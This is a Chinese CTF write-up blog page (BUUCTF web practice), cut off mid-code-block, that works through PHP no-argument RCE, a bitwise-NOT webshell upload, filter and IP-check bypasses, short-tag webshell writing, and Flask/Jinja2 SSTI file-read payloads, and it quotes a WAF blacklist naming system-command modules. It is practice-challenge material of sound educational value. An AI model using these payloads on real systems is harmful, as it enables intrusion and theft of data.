@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -write up -ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 凑字数用的，前言总要有点字在不显得空荡荡的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="buu练习5">
+<meta property="og:url" content="http://example.com/2022/03/07/buu%E7%BB%83%E4%B9%A05/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 凑字数用的，前言总要有点字在不显得空荡荡的。">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-03-07T10:34:20.000Z">
+<meta property="article:modified_time" content="2022-03-07T14:13:31.062Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -write up -ctf">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/03/07/buu练习5/"/>
+
+
+
+
+
+  <title>buu练习5 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/07/buu%E7%BB%83%E4%B9%A05/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">buu练习5</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-03-07T18:34:20+08:00">
+                2022-03-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>凑字数用的，前言总要有点字在不显得空荡荡的。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>上来啥都没有，经过尝试信息搜集发现是git源码泄露，用GitHack获取源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了伪协议相关的语句以及一些关键词，同时进行参数匹配，因此这是典型的无参数rce，这不巧了，前两天刚写的博客，因此直接用无参数rce的payload打就可以了。</p>
+<p>由于过滤了et，因此之前博客写的一些函数不能用了，这里要用下面这个函数：</p>
+<ul>
+<li>localconv():函数返回一包含本地数字及货币格式信息的数组</li>
+</ul>
+<p>我们用这个函数来获取第一个目录，即<code>.</code>，当前目录，然后扫目录找到flag文件读取就可以了，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<h1 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h1><p>审计源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">            $code=$_GET[&#x27;code&#x27;];</span><br><span class="line">                    if(strlen($code)&gt;40)&#123;</span><br><span class="line">                                        die(&quot;This is too Long.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">                                        die(&quot;NO.&quot;);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">            highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>很明显的无字符webshell，取反即可，但是我们发现phpinfo中过滤了大部分函数，因此我们不能直接rce。</p>
+<p>既然如此，先上传一句马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9e%8c%8c%9a%8d%8b)(~%9a%89%9e%93%d7%db%a0%af%b0%ac%ab%a4%ce%a2%d6);</span><br><span class="line"></span><br><span class="line">//assert(eval($_POST[1]));</span><br></pre></td></tr></table></figure>
+
+<p>在根目录下找到flag，但是不能直接读取，这里用蚁剑中的绕过disabled_functions插件，在虚拟终端中执行<code>/readflag</code>读取flag。</p>
+<h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h1><p>进入网页在审查元素中发现部分源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//1st</span><br><span class="line">$query = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123;</span><br><span class="line">    die(&#x27;Y0u are So cutE!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123;</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br><span class="line">&#125;</span><br><span class="line">!</span><br></pre></td></tr></table></figure>
+
+<p>代码中要求获取的变量名不含有<code>_</code>，用<code>%20</code>代替即可，而下面的内容匹配比较常规，用换行符绕过即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b%20u%20p%20t=23333%0A</span><br></pre></td></tr></table></figure>
+
+<p>接着提示我们下一步在<code>secrettw.php</code>文件中，访问发现由于ip不匹配，我们不能访问。但是在审查元素中发现jsfuck，控制台跑一下发现让我们POST一个Merak进去，随便POST之后得到源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Flag is here~But how to get it? &lt;?php </span><br><span class="line">error_reporting(0); </span><br><span class="line">include &#x27;takeip.php&#x27;;</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); </span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;Merak&#x27;]))&#123; </span><br><span class="line">    highlight_file(__FILE__); </span><br><span class="line">    die(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function change($v)&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = &#x27;&#x27;; </span><br><span class="line">    for($i=0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">$ip = getIp();</span><br><span class="line">if($ip!=&#x27;127.0.0.1&#x27;)</span><br><span class="line">echo &quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;.$ip;</span><br><span class="line">if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;</span><br><span class="line">echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);</span><br><span class="line">echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>审计代码，我们发现后端对ip进行了限制，对2333的内容进行了匹配，对file进行了change()，因此我们只要针对这三点绕过就可以了。</p>
+<p>先反写<code>flag.php</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function unchange($v)&#123; </span><br><span class="line"></span><br><span class="line">    $re = &#x27;&#x27;;</span><br><span class="line">    for($i=0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$file = unchange(&#x27;flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">echo base64_encode($file);</span><br><span class="line">?&gt;</span><br><span class="line">//ZmpdYSZmXGI=</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI=</span><br><span class="line"></span><br><span class="line">Client-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h1 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h1><p>审计源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function check($input)&#123;</span><br><span class="line">    if(preg_match(&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;</span><br><span class="line">        // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br><span class="line">        die(&#x27;hacker!!!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function waf($input)&#123;</span><br><span class="line">  if(is_array($input))&#123;</span><br><span class="line">      foreach($input as $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;</span><br><span class="line">if(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;</span><br><span class="line">    case &#x27;pwd&#x27;:</span><br><span class="line">        echo $dir;</span><br><span class="line">        break;</span><br><span class="line">    case &#x27;upload&#x27;:</span><br><span class="line">        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们要上传两个参数，action表示模式，data表示写入index.php中的内容。发现waf把php过滤了，因此要用到短标签，而空格被过滤，在php中可以用<code>%09</code>替代，payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?echo%09`ls%09/`?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>写入后访问pwd给出的路径，即可发现命令被执行，因此我们读取flag文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?echo%09`cat%09/flllllll1112222222lag`?&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h1><p>有一个base64加密与base64解密网页，将<code>&#123;&#123;2+2&#125;&#125;</code>进行base64加密后进行解密，发现结果为4，说明存在ssti。但是构建payload的时候发现有东西被过滤了，这里要bypass。</p>
+<p>根据提示发现debug页面，发现源码为<code>app.py</code>，因此是python flask。</p>
+<p>我们先读取源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现waf：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def waf(str): black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] for x in black_list : if x in str.lower() : return 1 @app.route(&amp;#39;/hint&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def hint(): txt = &amp;#34;失败乃成功之母！！&amp;#34</span><br></pre></td></tr></table></figure>
+
+<p>html解码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;</span><br></pre></td></tr></table></figure>
+
+<p>因此这里需要进行字符串拼接，遍历目录payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>读取flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;txt.galf_eht_si_siht/&#x27;[::-1],&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">payload2:</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><p>看到题目就想到应该是shrine模板注入，进行测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;2+2&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>回显是4，说明存在ssti。推测<code>&#123;undefined&#123;config&#125;&#125;</code>可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号。不过python还有一些内置函数，比如<code>url_for</code>和<code>get_flashed_messages</code>。</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line"></span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br><span class="line"></span><br><span class="line">/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config[&#x27;FLAG&#x27;]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>均可得到flag。</p>
+<h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p>进入网页看着一串代码头都大了，自己重新编辑下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span 